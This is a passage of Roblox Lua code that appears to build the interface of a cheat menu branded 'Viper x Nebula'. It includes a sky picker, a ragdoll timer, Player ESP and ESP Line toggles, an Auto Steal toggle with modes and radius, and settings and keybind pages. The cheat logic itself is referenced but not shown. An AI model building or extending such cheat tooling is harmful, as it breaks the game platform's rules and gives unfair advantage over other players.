            Toxic=Color3.fromRGB(135,255,20), ["Solar Eclipse"]=Color3.fromRGB(90,65,45),
            Hellscape=Color3.fromRGB(130,15,20), Heaven=Color3.fromRGB(240,230,190),
            Storm=Color3.fromRGB(90,105,125), Sunrise=Color3.fromRGB(255,175,95),
            ["Deep Space"]=Color3.fromRGB(35,25,90), ["Lavender Dream"]=Color3.fromRGB(185,155,255),
            Inferno=Color3.fromRGB(255,75,15), ["Mint Sky"]=Color3.fromRGB(125,255,205)
        }
        local function refreshSkyChoices()
            currentSkyLabel.Text = "Selected: " .. tostring(skyTheme)
            for _, item in ipairs(skyScroll:GetChildren()) do
                if item:IsA("TextButton") then
                    local chosen = item:GetAttribute("SkyName") == skyTheme
                    local st = item:FindFirstChildOfClass("UIStroke")
                    if st then st.Color = chosen and getThemeColor() or Color3.fromRGB(64,61,72); st.Thickness = chosen and 2 or 1 end
                end
            end
        end
        for i, name in ipairs(SKY_PRESETS_LIST) do
            local color = skySwatches[name] or Color3.fromRGB(100,120,160)
            local item = Instance.new("TextButton", skyScroll)
            item.Name = "Sky_" .. tostring(i)
            item.LayoutOrder = i
            item.BackgroundColor3 = color
            item.BorderSizePixel = 0
            item.Text = name
            item.TextColor3 = (color.R + color.G + color.B) / 3 > 0.62 and Color3.fromRGB(20,20,25) or WHITE
            item.Font = Enum.Font.GothamBold
            item.TextSize = 11
            item.AutoButtonColor = false
            item.ZIndex = 102
            item:SetAttribute("SkyName", name)
            Instance.new("UICorner", item).CornerRadius = UDim.new(0, 8)
            local st = Instance.new("UIStroke", item)
            st.Color = name == skyTheme and getThemeColor() or Color3.fromRGB(64,61,72)
            st.Thickness = name == skyTheme and 2 or 1
            item.Activated:Connect(function()
                skyTheme = name
                pcall(applyCustomSky, name)
                refreshSkyChoices()
                pcall(saveAllSettings)
            end)
        end
        openSkyPicker.Activated:Connect(function()
            openSkyPickerAnimated()
            refreshSkyChoices()
        end)
        refreshSkyChoices()
    end

    mkSect(visualPage, "Overlays")
    local ragTimerEnabled = false
    local ragTimerGui, ragTimerLabel, ragTimerBusy = nil, nil, false
    local ragTimerConn = nil
    local function ensureRagTimerGui()
        if ragTimerGui and ragTimerGui.Parent then return end
        local pg = LP:FindFirstChildOfClass("PlayerGui")
        if not pg then return end
        ragTimerGui = Instance.new("ScreenGui")
        ragTimerGui.Name = "ViperRagdollTimer"
        ragTimerGui.ResetOnSpawn = false
        ragTimerGui.IgnoreGuiInset = true
        ragTimerGui.DisplayOrder = 10000
        ragTimerGui.Parent = pg
        ragTimerLabel = Instance.new("TextLabel")
        ragTimerLabel.Name = "Timer"
        ragTimerLabel.AnchorPoint = Vector2.new(1, 0)
        ragTimerLabel.Position = UDim2.new(1, -18, 0, -38)
        ragTimerLabel.Size = UDim2.new(0, 66, 0, 28)
        ragTimerLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        ragTimerLabel.BackgroundTransparency = 0.05
        ragTimerLabel.BorderSizePixel = 0
        ragTimerLabel.Text = "2.5"
        ragTimerLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
        ragTimerLabel.TextSize = 15
        ragTimerLabel.Font = Enum.Font.GothamBold
        ragTimerLabel.Visible = false
        ragTimerLabel.Parent = ragTimerGui
        Instance.new("UICorner", ragTimerLabel).CornerRadius = UDim.new(0, 7)
        local st = Instance.new("UIStroke", ragTimerLabel)
        st.Color = Color3.fromRGB(255, 135, 35)
        st.Thickness = 1.5
    end
    local function startCompactRagTimer()
        if not ragTimerEnabled or ragTimerBusy then return end
        ragTimerBusy = true
        ensureRagTimerGui()
        if not ragTimerLabel then ragTimerBusy = false return end
        ragTimerLabel.Position = UDim2.new(1, -18, 0, -38)
        ragTimerLabel.Text = "2.5"
        ragTimerLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
        ragTimerLabel.Visible = true
        TS:Create(ragTimerLabel, TweenInfo.new(0.28, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(1, -18, 0, 18)}):Play()
        task.spawn(function()
            local t = 2.5
            while t >= 0 and ragTimerEnabled do
                if ragTimerLabel then
                    ragTimerLabel.Text = string.format("%.1f", t)
                    ragTimerLabel.TextColor3 = t <= 0.5 and Color3.fromRGB(220, 50, 50) or Color3.fromRGB(0, 0, 0)
                end
                task.wait(0.1)
                t = math.max(0, math.floor((t - 0.1) * 10 + 0.5) / 10)
            end
            if ragTimerLabel and ragTimerEnabled then
                ragTimerLabel.Text = "STEAL!"
                ragTimerLabel.TextColor3 = Color3.fromRGB(30, 160, 70)
                task.wait(0.45)
                TS:Create(ragTimerLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(1, -18, 0, -38)}):Play()
                task.wait(0.22)
                if ragTimerLabel then ragTimerLabel.Visible = false end
            end
            ragTimerBusy = false
        end)
    end
    setRagTimerVisual = mkToggle(visualPage, "Ragdoll Timer", function(on)
        ragTimerEnabled = on
        if on then
            ensureRagTimerGui()
            if ragTimerConn then ragTimerConn:Disconnect() end
            ragTimerConn = RunService.Heartbeat:Connect(function()
                if not ragTimerEnabled or ragTimerBusy then return end
                local char = LP.Character
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                if not hum then return end
                local state = hum:GetState()
                if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
                    startCompactRagTimer()
                end
            end)
        else
            if ragTimerConn then ragTimerConn:Disconnect(); ragTimerConn = nil end
            if ragTimerGui then ragTimerGui:Destroy() end
            ragTimerGui, ragTimerLabel, ragTimerBusy = nil, nil, false
        end
    end)
    setESPVIsual = mkToggle(visualPage, "Player ESP", function(on) toggleESP(on) end)
    setESPLineVisual = mkToggle(visualPage, "ESP Line", function(on)
        if on then startESPLine() else stopESPLine() end
    end)

    local settingsPage = contentPages["Settings"]

    mkSect(settingsPage, "VIPER X NEBULA TOOLS")
    do
        local musicRow = mkRow(settingsPage, 44)
        musicRow.Name = "ViperNebulaMusicPlayerRow"
        mkLabel(musicRow, "Viper x Nebula Music Player")

        local musicButton = Instance.new("TextButton", musicRow)
        musicButton.Name = "OpenViperNebulaMusicPlayer"
        musicButton.Size = UDim2.new(0, 112, 0, 28)
        musicButton.Position = UDim2.new(1, -122, 0.5, -14)
        musicButton.BorderSizePixel = 0
        musicButton.Font = Enum.Font.GothamBold
        musicButton.TextSize = 10
        musicButton.AutoButtonColor = false
        musicButton.ZIndex = 9
        Instance.new("UICorner", musicButton).CornerRadius = UDim.new(0, 8)
        local musicStroke = Instance.new("UIStroke", musicButton)
        musicStroke.Thickness = 1.2
        musicStroke.Transparency = 0.18

        local function refreshMusicBtn()
            local isOpen = (_G.ViperSavedMusicPlayerOpen == true)
            if isOpen then
                musicButton.Text = "CLOSE"
                musicButton.BackgroundColor3 = Color3.fromRGB(55, 20, 35)
                musicButton.TextColor3 = Color3.fromRGB(255, 120, 140)
                musicStroke.Color = Color3.fromRGB(220, 60, 80)
            else
                musicButton.Text = "OPEN"
                musicButton.BackgroundColor3 = Color3.fromRGB(24, 28, 42)
                musicButton.TextColor3 = WHITE
                musicStroke.Color = getThemeColor()
            end
        end

        _G.__RefreshMusicMenuBtn = refreshMusicBtn
        refreshMusicBtn()

        musicButton.Activated:Connect(function()
            if _G.ViperSavedMusicPlayerOpen == true then
                if type(_G.CloseMusicPanel) == "function" then
                    _G.CloseMusicPanel()
                else
                    local guiP = getGuiContainer()
                    local ex = guiP and guiP:FindFirstChild("RestreintMusicPanel")
                    if ex then ex:Destroy() end
                    _G.ViperSavedMusicPlayerOpen = false
                    if saveAllSettings then saveAllSettings() end
                end
            else
                if type(_G.OpenMusicPanel) == "function" then
                    _G.OpenMusicPanel()
                end
            end
            refreshMusicBtn()
        end)
    end


    mkSect(settingsPage, "QUICK SEARCH")
    do
        local searchRow = mkRow(settingsPage, 48)
        searchRow.Name = "ViperQuickSearchRow"
        mkLabel(searchRow, "Search menu settings")
        local settingsSearchButton = Instance.new("TextButton", searchRow)
        settingsSearchButton.Name = "OpenVIPERSearchFromSettings"
        settingsSearchButton.Size = UDim2.new(0, 112, 0, 30)
        settingsSearchButton.Position = UDim2.new(1, -122, 0.5, -15)
        settingsSearchButton.BackgroundColor3 = Color3.fromRGB(255, 110, 20)
        settingsSearchButton.BorderSizePixel = 0
        settingsSearchButton.Text = "⌕  SEARCH"
        settingsSearchButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        settingsSearchButton.Font = Enum.Font.GothamBold
        settingsSearchButton.TextSize = 11
        settingsSearchButton.AutoButtonColor = true
        settingsSearchButton.ZIndex = 9
        Instance.new("UICorner", settingsSearchButton).CornerRadius = UDim.new(0, 8)
        local settingsSearchStroke = Instance.new("UIStroke", settingsSearchButton)
        settingsSearchStroke.Color = Color3.fromRGB(255, 170, 75)
        settingsSearchStroke.Thickness = 1.2
        settingsSearchStroke.Transparency = 0.12
        settingsSearchButton.Activated:Connect(function()
            if openVIPERSearch then openVIPERSearch() end
        end)
    end

    mkSect(settingsPage, "VIPER INTRO")
    local introToggleVisual
    introToggleVisual = mkToggle(settingsPage, "Play Intro on Start", function(on)
        playIntroEnabled = on == true
        task.defer(function() pcall(saveAllSettings, true) end)
    end)
    if introToggleVisual then pcall(function() introToggleVisual(playIntroEnabled) end) end

    mkSect(settingsPage, "SCALES & SIZES")

    -- 1. UI Size
    local uiSlider = mkExpandableSlider(settingsPage, "UI Scale (%)", 40, 180, uiScaleValue, function(v)
        uiScaleValue = math.clamp(tonumber(v) or uiScaleValue, 40, 180)
        if main and main.Parent then
            if not mainUIScale or mainUIScale.Parent ~= main then
                mainUIScale = main:FindFirstChild("MainUIScale")
                if not mainUIScale then
                    mainUIScale = Instance.new("UIScale")
                    mainUIScale.Name = "MainUIScale"
                    mainUIScale.Parent = main
                end
            end
            -- Keep intro animation and user scale on the same UIScale instance.
            mainUIScale.Scale = uiScaleValue / 100
        end
        task.defer(function() pcall(saveAllSettings) end)
    end)
    scaleSliderSetters.ui = uiSlider

    -- 2. Auto Grab Size
    local grabSlider = mkExpandableSlider(settingsPage, "Auto Grab Bar Scale (%)", 30, 200, math.floor((pbScale and pbScale.Scale or autoGrabScale) * 100), function(v)
        autoGrabScale = v / 100
        if pbScale then pbScale.Scale = autoGrabScale end
    end)
    scaleSliderSetters.autoGrab = grabSlider

    -- 3. Mobile Button Size
    local mobSlider = mkExpandableSlider(settingsPage, "Mobile Button Scale (%)", 40, 250, math.floor(floatingButtonScale * 100), function(v)
        floatingButtonScale = v / 100
        for _, s in ipairs(_floatingUIScales) do
            if s and s.Parent then s.Scale = floatingButtonScale end
        end
    end)
    scaleSliderSetters.mobileButtons = mobSlider


    mkSect(settingsPage, "UI LAYOUT")
    local uiLayoutChoiceButtons = {}
    local function addUILayoutSelector(titleText, settingKey, options)
        local row = mkRow(settingsPage, 44)
        row.Name = "ViperUILayout_" .. settingKey
        local label = mkLabel(row, titleText)
        label.Size = UDim2.new(0.48, -8, 1, 0)
        label.TextSize = 12
        label.TextColor3 = Color3.fromRGB(255, 255, 255)

        local button = Instance.new("TextButton", row)
        button.Name = "Value_" .. settingKey
        button.AnchorPoint = Vector2.new(1, 0.5)
        button.Position = UDim2.new(1, -8, 0.5, 0)
        button.Size = UDim2.new(0, 150, 0, 29)
        button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        button.BorderSizePixel = 0
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
        button.Font = Enum.Font.GothamBold
        button.TextSize = 10
        button.AutoButtonColor = false
        button.Text = tostring(uiLayoutSettings[settingKey] or options[1]) .. "  ›"
        button.ZIndex = 12
        Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)
        local outline = Instance.new("UIStroke", button)
        outline.Color = Color3.fromRGB(255, 255, 255)
        outline.Transparency = 0.48
        outline.Thickness = 1
        table.insert(uiLayoutChoiceButtons, {button = button, settingKey = settingKey, options = options})

        button.Activated:Connect(function()
            local current = uiLayoutSettings[settingKey]
            local index = table.find(options, current) or 1
            local nextValue = options[index % #options + 1]
            uiLayoutSettings[settingKey] = nextValue
            button.Text = tostring(nextValue) .. "  ›"
            if applyUILayoutSettings then pcall(applyUILayoutSettings) end
            task.defer(function() pcall(saveAllSettings, true) end)
        end)
    end
    addUILayoutSelector("NAV / SIDEBAR", "navLayout", {"Top", "Left", "Right", "Bottom"})
    addUILayoutSelector("PANEL SHAPE", "panelShape", {"Rounded", "Square"})
    addUILayoutSelector("MOBILE BUTTON", "mobileShape", {"Rounded", "Square", "Circle", "Hexagon"})

    local stealPage = contentPages["Steal"]

    mkSect(stealPage, "AUTO GRAB UI")
    do
        local row = mkRow(stealPage, 48)
        mkLabel(row, "Interface Style")

        local holder = Instance.new("Frame", row)
        holder.Name = "AutoGrabUISelector"
        holder.Size = UDim2.new(0, 126, 0, 30)
        holder.Position = UDim2.new(1, -134, 0.5, -15)
        holder.BackgroundColor3 = Color3.fromRGB(13, 13, 19)
        holder.BorderSizePixel = 0
        holder.ClipsDescendants = true
        holder.ZIndex = 8
        Instance.new("UICorner", holder).CornerRadius = UDim.new(0, 10)

        local outline = Instance.new("UIStroke", holder)
        outline.Color = Color3.fromRGB(65, 48, 45)
        outline.Thickness = 1
        outline.Transparency = 0.2

        local slider = Instance.new("Frame", holder)
        slider.Name = "ActiveStyle"
        slider.Size = UDim2.new(0.5, -3, 1, -4)
        slider.Position = UDim2.new(0, 2, 0, 2)
        slider.BackgroundColor3 = Color3.fromRGB(255, 112, 24)
        slider.BorderSizePixel = 0
        slider.ZIndex = 9
        Instance.new("UICorner", slider).CornerRadius = UDim.new(0, 8)

        local sliderGrad = Instance.new("UIGradient", slider)
        sliderGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 153, 55)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(205, 55, 20)),
        })
        sliderGrad.Rotation = 90

        local v1Label = Instance.new("TextLabel", holder)
        v1Label.BackgroundTransparency = 1
        v1Label.Size = UDim2.new(0.5, 0, 1, 0)
        v1Label.Text = "V1"
        v1Label.Font = Enum.Font.GothamBlack
        v1Label.TextSize = 12
        v1Label.TextColor3 = Color3.fromRGB(255, 255, 255)
        v1Label.ZIndex = 10

        local v2Label = Instance.new("TextLabel", holder)
        v2Label.BackgroundTransparency = 1
        v2Label.Size = UDim2.new(0.5, 0, 1, 0)
        v2Label.Position = UDim2.new(0.5, 0, 0, 0)
        v2Label.Text = "V2"
        v2Label.Font = Enum.Font.GothamBlack
        v2Label.TextSize = 12
        v2Label.TextColor3 = Color3.fromRGB(155, 150, 160)
        v2Label.ZIndex = 10

        local v1Button = Instance.new("TextButton", holder)
        v1Button.BackgroundTransparency = 1
        v1Button.Text = ""
        v1Button.Size = UDim2.new(0.5, 0, 1, 0)
        v1Button.ZIndex = 11
        v1Button.AutoButtonColor = false

        local v2Button = Instance.new("TextButton", holder)
        v2Button.BackgroundTransparency = 1
        v2Button.Text = ""
        v2Button.Size = UDim2.new(0.5, 0, 1, 0)
        v2Button.Position = UDim2.new(0.5, 0, 0, 0)
        v2Button.ZIndex = 11
        v2Button.AutoButtonColor = false

        local function updateAutoGrabUISelector()
            local isV2 = selectedAutoGrabUI == "V2"
            TS:Create(slider, TweenInfo.new(0.22, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                Position = isV2 and UDim2.new(0.5, 1, 0, 2) or UDim2.new(0, 2, 0, 2)
            }):Play()
            TS:Create(v1Label, TweenInfo.new(0.15), {
                TextColor3 = isV2 and Color3.fromRGB(155, 150, 160) or Color3.fromRGB(255, 255, 255)
            }):Play()
            TS:Create(v2Label, TweenInfo.new(0.15), {
                TextColor3 = isV2 and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(155, 150, 160)
            }):Play()
            applyAutoGrabUIVersion(selectedAutoGrabUI)
            task.defer(function() pcall(saveAllSettings) end)
        end
        refreshAutoGrabUISelector = updateAutoGrabUISelector

        v1Button.MouseButton1Click:Connect(function()
            selectedAutoGrabUI = "V1"
            updateAutoGrabUISelector()
        end)
        v2Button.MouseButton1Click:Connect(function()
            selectedAutoGrabUI = "V2"
            updateAutoGrabUISelector()
        end)
        updateAutoGrabUISelector()
    end

    mkSect(stealPage, "Automation")

    do
        -- Auto Steal sub-panel (V1/V2 + Radius), hidden by default
        local asSubPanel = Instance.new("Frame", stealPage)
        asSubPanel.Name = "AutoStealSubPanel"
        asSubPanel.Size = UDim2.new(1, -4, 0, 0)
        asSubPanel.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
        asSubPanel.BackgroundTransparency = 0.3
        asSubPanel.BorderSizePixel = 0
        asSubPanel.ClipsDescendants = true
        Instance.new("UICorner", asSubPanel).CornerRadius = UDim.new(0, 8)
        local asSubLayout = Instance.new("UIListLayout", asSubPanel)
        asSubLayout.SortOrder = Enum.SortOrder.LayoutOrder
        asSubLayout.Padding = UDim.new(0, 4)
        local asSubPad = Instance.new("UIPadding", asSubPanel)
        asSubPad.PaddingLeft = UDim.new(0, 8)
        asSubPad.PaddingRight = UDim.new(0, 8)
        asSubPad.PaddingTop = UDim.new(0, 4)
        asSubPad.PaddingBottom = UDim.new(0, 4)

        local AS_ROWS_H = 52 -- V1V2 row only
        local function onASExpand(isOpen)
            if isOpen then
                asSubPanel.Visible = true
            end
            TS:Create(asSubPanel, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                Size = UDim2.new(1, -4, 0, isOpen and AS_ROWS_H or 0)
            }):Play()
            if not isOpen then
                task.delay(0.22, function()
                    if asSubPanel and asSubPanel.Parent and not CONFIG.AUTO_STEAL_ENABLED then
                        asSubPanel.Visible = false
                    end
                end)
            end
        end
        asSubPanel.Visible = false

        -- Toggle FIRST → lower LayoutOrder (appears above sub-panel)
        setInstaGrab = mkToggle(stealPage, "Auto Steal", function(on)
            CONFIG.AUTO_STEAL_ENABLED = on
            onASExpand(on)
            if on then pcall(startAutoSteal) else stopAutoSteal() end
            updateProgressBarVisibility()
        end)

        -- Sub-panel gets order AFTER toggle → appears below it
        asSubPanel.LayoutOrder = getNextOrder(stealPage)

        -- V1 / V2 selector inside subpanel
        do
            local row = mkRow(asSubPanel, 42)
            mkLabel(row, "Steal Mode")

            local holder = Instance.new("Frame", row)
            holder.Name = "StealModeSelector"
            holder.BackgroundColor3 = Color3.fromRGB(15,15,20)
            holder.BackgroundTransparency = 0.15
            holder.Size = UDim2.new(0, 120, 0, 30)
            holder.Position = UDim2.new(1, -130, 0.5, -15)
            holder.BorderSizePixel = 0
            holder.ClipsDescendants = true
            holder.ZIndex = 8
            Instance.new("UICorner", holder).CornerRadius = UDim.new(0, 15)

            local holderStroke = Instance.new("UIStroke", holder)
            holderStroke.Color = Color3.fromRGB(60,60,70)
            holderStroke.Thickness = 1
            holderStroke.Transparency = 0.35

            local slide2 = Instance.new("Frame", holder)
            slide2.Name = "SelectedSlide"
            slide2.BackgroundColor3 = getThemeColor()
            slide2.BackgroundTransparency = 0.15
            slide2.Size = UDim2.new(0.5, -3, 1, -4)
            slide2.Position = UDim2.new(0, 2, 0, 2)
            slide2.BorderSizePixel = 0
            slide2.ZIndex = 9
            Instance.new("UICorner", slide2).CornerRadius = UDim.new(0, 13)
            local sg2 = Instance.new("UIGradient", slide2)
            sg2.Color = viperGradient(getThemeColor())
            sg2.Rotation = 0
            local ss2 = Instance.new("UIStroke", slide2)
            ss2.Color = getThemeColor()
            ss2.Thickness = 1.2
            ss2.Transparency = 0.1

            local v1T2 = Instance.new("TextLabel", holder)
            v1T2.BackgroundTransparency = 1; v1T2.Text = "V1"
            v1T2.TextColor3 = Color3.fromRGB(255,255,255)
            v1T2.Font = Enum.Font.GothamBlack; v1T2.TextSize = 12
            v1T2.Size = UDim2.new(0.5,0,1,0); v1T2.Position = UDim2.new(0,0,0,0); v1T2.ZIndex = 10

            local v2T2 = Instance.new("TextLabel", holder)
            v2T2.BackgroundTransparency = 1; v2T2.Text = "V2 ★"
            v2T2.TextColor3 = Color3.fromRGB(150,150,165)
            v2T2.Font = Enum.Font.GothamBlack; v2T2.TextSize = 10
            v2T2.Size = UDim2.new(0.5,0,1,0); v2T2.Position = UDim2.new(0.5,0,0,0); v2T2.ZIndex = 10

            local v1C2 = Instance.new("TextButton", holder)
            v1C2.BackgroundTransparency=1; v1C2.Text=""; v1C2.AutoButtonColor=false
            v1C2.Size=UDim2.new(0.5,0,1,0); v1C2.Position=UDim2.new(0,0,0,0); v1C2.ZIndex=11

            local v2C2 = Instance.new("TextButton", holder)
            v2C2.BackgroundTransparency=1; v2C2.Text=""; v2C2.AutoButtonColor=false
            v2C2.Size=UDim2.new(0.5,0,1,0); v2C2.Position=UDim2.new(0.5,0,0,0); v2C2.ZIndex=11

            local function setStealModeVisual2(mode)
                local onV2 = (mode == "V2")
                TS:Create(slide2, TweenInfo.new(0.22, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                    Position = onV2 and UDim2.new(0.5, 1, 0, 2) or UDim2.new(0, 2, 0, 2)
                }):Play()
                TS:Create(v1T2, TweenInfo.new(0.18), {TextColor3 = onV2 and Color3.fromRGB(150,150,165) or Color3.fromRGB(255,255,255)}):Play()
                TS:Create(v2T2, TweenInfo.new(0.18), {TextColor3 = onV2 and Color3.fromRGB(255,255,255) or Color3.fromRGB(150,150,165)}):Play()
            end

            local function changeMode2(mode)
                local newMode = (mode == "V2") and "V2" or "V1"
                if newMode == selectedStealMode then return end
                selectedStealMode = newMode
                if selectedStealMode == "V2" then
                    CONFIG.STEAL_RANGE = 60; Steal.StealRadius = 60
                    if radInput then radInput.Text = "60" end
                end
                setStealModeVisual2(selectedStealMode)
                if CONFIG.AUTO_STEAL_ENABLED then pcall(startAutoSteal) end
                saveAllSettings()
            end
            v1C2.MouseButton1Click:Connect(function() changeMode2("V1") end)
            v2C2.MouseButton1Click:Connect(function() changeMode2("V2") end)
            -- "Recommended" badge under V2 side
            local recBadge = Instance.new("TextLabel", holder)
            recBadge.BackgroundTransparency = 1
            recBadge.Text = "recommended"
            recBadge.TextColor3 = getThemeColor()
            recBadge.Font = Enum.Font.Gotham
            recBadge.TextSize = 7
            recBadge.Size = UDim2.new(0.5, 0, 0, 10)
            recBadge.Position = UDim2.new(0.5, 0, 1, -10)
            recBadge.TextXAlignment = Enum.TextXAlignment.Center
            recBadge.ZIndex = 10

            _G._viperStealSlide = slide2
            _G._viperStealModeSetter = setStealModeVisual2
            setStealModeVisual2(selectedStealMode)
        end

    end

    -- Steal Radius directly in Config tab (always visible)
    do
        local row = mkRow(stealPage, 42)
        mkLabel(row, "Steal Radius")
        radInput = mkBox(row, CONFIG.STEAL_RANGE, 50, 56, function(v)
            if v and v >= 5 and v <= 300 then
                CONFIG.STEAL_RANGE = _floor(v+0.5)
                Steal.StealRadius = CONFIG.STEAL_RANGE
                radInput.Text = tostring(CONFIG.STEAL_RANGE)
                saveAllSettings()
            end
        end)
    end

    do
        local row = mkRow(stealPage, 44)
        row.Size = UDim2.new(1, 0, 0, 44)
        local delBtn = Instance.new("TextButton", row)
        delBtn.Size = UDim2.new(1, -12, 0.8, 0)
        delBtn.Position = UDim2.new(0, 6, 0.1, 0)
        delBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
        delBtn.BorderSizePixel = 0
        delBtn.Text = "RESET ALL SETTINGS"
        delBtn.TextColor3 = Color3.fromRGB(170, 30, 50)
        delBtn.Font = Enum.Font.GothamBold
        delBtn.TextSize = 13
        delBtn.AutoButtonColor = false
        delBtn.ZIndex = 8
        Instance.new("UICorner", delBtn).CornerRadius = UDim.new(0, 10)
        local delStroke = Instance.new("UIStroke", delBtn)
        delStroke.Color = Color3.fromRGB(200, 60, 80)
        delStroke.Thickness = 1.5
        delStroke.Transparency = 0.4
        delBtn.MouseEnter:Connect(function()
            TS:Create(delBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(200, 50, 70)}):Play()
            TS:Create(delBtn, TweenInfo.new(0.15), {TextColor3 = Color3.fromRGB(255,255,255)}):Play()
        end)
        delBtn.MouseLeave:Connect(function()
            TS:Create(delBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(245, 245, 250)}):Play()
            TS:Create(delBtn, TweenInfo.new(0.15), {TextColor3 = Color3.fromRGB(170, 30, 50)}):Play()
        end)
        local deleteState = 0
        local originalDeleteText = "RESET ALL SETTINGS"
        local delDebounce = false
        delBtn.MouseButton1Click:Connect(function()
            if delDebounce then return end
            if deleteState == 0 then
                deleteState = 1
                delBtn.Text = "CONFIRM?"
                delBtn.BackgroundColor3 = Color3.fromRGB(255, 220, 220)
                delBtn.TextColor3 = Color3.fromRGB(160, 0, 0)
                task.delay(2, function()
                    if delBtn and delBtn.Parent and deleteState == 1 then
                        deleteState = 0
                        delBtn.Text = originalDeleteText
                        delBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
                        delBtn.TextColor3 = Color3.fromRGB(170, 30, 50)
                    end
                end)
            elseif deleteState == 1 then
                delDebounce = true
                local invoked, success = pcall(resetToFactoryDefaults)
                success = invoked and success
                delBtn.Text = success and "SETTINGS RESET" or "ERROR"
                delBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
                delBtn.TextColor3 = Color3.fromRGB(170, 30, 50)
                deleteState = 0
                task.delay(1.5, function()
                    if delBtn and delBtn.Parent then
                        delBtn.Text = originalDeleteText
                        delBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
                        delBtn.TextColor3 = Color3.fromRGB(170, 30, 50)
                        delDebounce = false
                    end
                end)
            end
        end)
    end

        mkSect(settingsPage, "Management")
    do
        local row = mkRow(settingsPage, 44)
        row.Size = UDim2.new(1, 0, 0, 44)
        local saveBtn = Instance.new("TextButton", row)
        saveBtn.Size = UDim2.new(1, -12, 0.8, 0)
        saveBtn.Position = UDim2.new(0, 6, 0.1, 0)
        saveBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
        saveBtn.BorderSizePixel = 0
        saveBtn.Text = "SAVE CONFIG"
        saveBtn.TextColor3 = Color3.fromRGB(20, 20, 25)
        saveBtn.Font = Enum.Font.GothamBold
        saveBtn.TextSize = 13
        saveBtn.AutoButtonColor = false
        saveBtn.ZIndex = 8
        Instance.new("UICorner", saveBtn).CornerRadius = UDim.new(0, 10)
        local saveStroke = Instance.new("UIStroke", saveBtn)
        saveStroke.Color = getThemeColor()
        saveStroke.Thickness = 1.5
        saveStroke.Transparency = 0.4
        saveBtn.MouseEnter:Connect(function()
            TS:Create(saveBtn, TweenInfo.new(0.15), {BackgroundColor3 = getThemeColor()}):Play()
            TS:Create(saveBtn, TweenInfo.new(0.15), {TextColor3 = Color3.fromRGB(255,255,255)}):Play()
        end)
        saveBtn.MouseLeave:Connect(function()
            TS:Create(saveBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(245, 245, 250)}):Play()
            TS:Create(saveBtn, TweenInfo.new(0.15), {TextColor3 = Color3.fromRGB(20, 20, 25)}):Play()
        end)
        saveBtn.MouseButton1Click:Connect(function()
            local ok = saveAllSettings(true)
            saveBtn.Text = ok and "SAVED" or "ERROR"
            task.delay(1.2, function()
                if saveBtn and saveBtn.Parent then saveBtn.Text = "SAVE CONFIG" end
            end)
        end)
    end

    do
        local row = mkRow(settingsPage, 44)
        row.Size = UDim2.new(1, 0, 0, 44)
        local resetPosBtn = Instance.new("TextButton", row)
        resetPosBtn.Size = UDim2.new(1, -12, 0.8, 0)
        resetPosBtn.Position = UDim2.new(0, 6, 0.1, 0)
        resetPosBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
        resetPosBtn.BorderSizePixel = 0
        resetPosBtn.Text = "RESET POSITIONS"
        resetPosBtn.TextColor3 = Color3.fromRGB(20, 20, 25)
        resetPosBtn.Font = Enum.Font.GothamBold
        resetPosBtn.TextSize = 13
        resetPosBtn.AutoButtonColor = false
        resetPosBtn.ZIndex = 8
        Instance.new("UICorner", resetPosBtn).CornerRadius = UDim.new(0, 10)
        local resetStroke = Instance.new("UIStroke", resetPosBtn)
        resetStroke.Color = getThemeColor()
        resetStroke.Thickness = 1.5
        resetStroke.Transparency = 0.4
        resetPosBtn.MouseEnter:Connect(function()
            TS:Create(resetPosBtn, TweenInfo.new(0.15), {BackgroundColor3 = getThemeColor()}):Play()
            TS:Create(resetPosBtn, TweenInfo.new(0.15), {TextColor3 = Color3.fromRGB(255,255,255)}):Play()
        end)
        resetPosBtn.MouseLeave:Connect(function()
            TS:Create(resetPosBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(245, 245, 250)}):Play()
            TS:Create(resetPosBtn, TweenInfo.new(0.15), {TextColor3 = Color3.fromRGB(20, 20, 25)}):Play()
        end)
        local resetDebounce = false
        resetPosBtn.MouseButton1Click:Connect(function()
            if resetDebounce then return end
            resetDebounce = true
            resetFloatingPositions()
            resetPosBtn.Text = "RESET"
            task.delay(1.2, function()
                if resetPosBtn and resetPosBtn.Parent then
                    resetPosBtn.Text = "RESET POSITIONS"
                    resetDebounce = false
                end
            end)
        end)
    end

local keyPage = contentPages["Keybinds"]

    -- Subtab selector: [ Keybinds ]  [ Mobile Buttons ]
    local subNavRow = Instance.new("Frame", keyPage)
    subNavRow.Name = "SubNavRow"
    subNavRow.Size = UDim2.new(1, -4, 0, 36)
    subNavRow.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
    subNavRow.BorderSizePixel = 0
    subNavRow.LayoutOrder = getNextOrder(keyPage)
    subNavRow.ZIndex = 8
    Instance.new("UICorner", subNavRow).CornerRadius = UDim.new(0, 10)
    local subStroke = Instance.new("UIStroke", subNavRow)
